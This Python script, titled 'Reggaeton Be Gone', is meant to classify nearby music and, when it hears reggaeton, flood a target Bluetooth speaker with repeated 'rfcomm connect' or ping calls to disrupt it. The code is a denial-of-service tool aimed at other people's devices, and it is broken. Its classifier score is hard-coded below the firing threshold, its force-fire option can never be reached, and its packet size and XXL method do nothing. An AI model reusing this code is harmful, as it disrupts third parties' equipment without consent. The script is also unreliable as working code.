import subprocess
import time
import datetime

# Constantes para los métodos de fuego
METHOD_SMALL = 1
METHOD_MEDIUM = 2
METHOD_XXL = 3

# Constantes para el tamaño de los paquetes y el umbral de reguetón
PACKAGES_SIZE = 800
THRESHOLD = 0.95

# Configuración por defecto
DEFAULT_SETTINGS = {
    'targetAddr': ":::::",
    'threadsCount': 1000,
    'myDelay': 0.1,
    'forceFire': 0,
    'model': "reggaetonbgone-linux-armv7-v4.eim"
}

# Función para escribir en el registro
def write_log(msg):
    now = datetime.datetime.now()
    dt_formatted = now.strftime("%Y-%m-%d %H:%M:%S")
    with open('log.txt', 'a') as f:
        log_line = f"{dt_formatted},{msg}"
        f.write(log_line + "\n")

# Funciones de disparo para diferentes métodos
def fire_small(addr, count, size, delay):
    write_log(f"Firing with method #1, pkg {size}, target {addr}")
    for i in range(count):
        subprocess.call(['rfcomm', 'connect', addr, '1'])
        time.sleep(delay)

def fire_medium(addr, count, size, delay):
    write_log(f"Firing with method #2, pkg {size}, target {addr}")
    for i in range(count):
        subprocess.call(['ping', '-c', '1', addr])
        time.sleep(delay)

def fire_xxl(addr, count, size, delay):
    write_log(f"Firing with method #3, pkg {size}, target {addr}")
    # Esta versión no incluye el método XXL
    pass

# Función principal
def main():
    # Configuración inicial
    settings = DEFAULT_SETTINGS.copy()

    print("\nReggaeton Be Gone 1.0")
    print("Waiting for trigger...\n")

    write_log("Started")

    print("Listening...")
    write_log("Listening")

    # Ejecutar modelo de inteligencia artificial
    model_file = settings['model']
    try:
        labels = ['reggaeton']  # Simulamos las etiquetas del modelo
        while True:
            # Simulamos la clasificación del modelo
            score = 0.9  # Simulamos el puntaje de confianza
            if score <= THRESHOLD:
                print('Is reggaeton? No')
            elif score > THRESHOLD or settings['forceFire'] == 1:
                print(f"Firing speaker. Score: {score * 100}%")
                fire_medium(settings['targetAddr'], settings['threadsCount'],
                            PACKAGES_SIZE, settings['myDelay'])

            time.sleep(1)

    except KeyboardInterrupt:
        print("\nInterrupted")
        write_log("Interrupted")

if __name__ == '__main__':
    main()
